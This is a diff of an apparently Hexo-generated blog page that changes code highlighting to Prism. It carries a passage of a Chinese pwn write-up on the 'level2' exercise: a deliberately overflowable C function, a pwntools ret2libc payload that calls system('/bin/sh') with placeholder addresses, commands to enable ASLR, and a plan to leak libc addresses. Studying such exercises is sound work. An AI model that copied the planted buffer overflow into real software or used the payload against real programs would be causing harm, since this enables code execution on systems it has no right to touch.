@@ -294,7 +294,8 @@
     <!-- Custom Head -->
     
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
     
@@ -480,10 +481,38 @@
         <blockquote>
 <p>不知道为什么题目在我电脑上都无法复现，崩溃.jpg</p>
 </blockquote>
-<p>还是上次的<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</div><div class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    vulnerable_function();</div><div class="line">    write(STDOUT_FILENO, <span class="string">"Hello, world\n"</span>, <span class="number">13</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<h2 id="关闭ASLR和stack-protector-意思是栈段没办法执行了"><a href="#关闭ASLR和stack-protector-意思是栈段没办法执行了" class="headerlink" title="关闭ASLR和stack protector, 意思是栈段没办法执行了"></a>关闭ASLR和stack protector, 意思是栈段没办法执行了</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'./level2'</span>)</div><div class="line">system_ret = xxx    <span class="comment"># 开始漏掉了这个</span></div><div class="line">system_addr = xxx</div><div class="line">binsh_addr = xxx</div><div class="line"></div><div class="line">payload = <span class="string">'A'</span> * <span class="number">140</span> <span class="comment"># 覆盖缓冲区</span></div><div class="line">payload += p32(system_ret) <span class="comment">#用system的地址覆盖vulner的返回地址，以跳到system上</span></div><div class="line">payload += p32(system_addr) <span class="comment"># 函数调用地址和函数参数之间是隔着一个函数返回地址的，开始忘记了==!i'm good vegetable</span></div><div class="line">payload += p32(binsh_addr) <span class="comment"># system 的参数</span></div><div class="line">p.send(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
-<h2 id="开启ASLR，仍然是上面的level2"><a href="#开启ASLR，仍然是上面的level2" class="headerlink" title="开启ASLR，仍然是上面的level2"></a>开启ASLR，仍然是上面的level2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo -s</div><div class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</div></pre></td></tr></table></figure>
-<p>可以通过多次的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /proc/[pid of level2]/maps</div></pre></td></tr></table></figure></p>
+<p>还是上次的</p>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
+<span class="token keyword">void</span> <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> <span class="token string">"Hello, world\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="关闭ASLR和stack-protector-意思是栈段没办法执行了"><a href="#关闭ASLR和stack-protector-意思是栈段没办法执行了" class="headerlink" title="关闭ASLR和stack protector, 意思是栈段没办法执行了"></a>关闭ASLR和stack protector, 意思是栈段没办法执行了</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level2'</span><span class="token punctuation">)</span>
+system_ret <span class="token operator">=</span> xxx    <span class="token comment" spellcheck="true"># 开始漏掉了这个</span>
+system_addr <span class="token operator">=</span> xxx
+binsh_addr <span class="token operator">=</span> xxx
+
+payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">140</span> <span class="token comment" spellcheck="true"># 覆盖缓冲区</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_ret<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#用system的地址覆盖vulner的返回地址，以跳到system上</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 函数调用地址和函数参数之间是隔着一个函数返回地址的，开始忘记了==!i'm good vegetable</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># system 的参数</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="开启ASLR，仍然是上面的level2"><a href="#开启ASLR，仍然是上面的level2" class="headerlink" title="开启ASLR，仍然是上面的level2"></a>开启ASLR，仍然是上面的level2</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> -s
+<span class="token keyword">echo</span> 2 <span class="token operator">></span> /proc/sys/kernel/randomize_va_space
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>可以通过多次的</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> /proc/<span class="token punctuation">[</span>pid of level2<span class="token punctuation">]</span>/maps
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>来看到ASLR确实起作用了</p>
 <p>思路是leak出<code>libc.so</code>出某些函数的地址，然后算偏移量以得到<code>system()</code>和<code>bin/sh</code>地址</p>
 <p>根据人家所说<br>Program Image是<code>Unrandomized</code>的<br><code>random</code>的是<code>libc</code>,<code>stack</code>和<code>heap</code>这些</p>
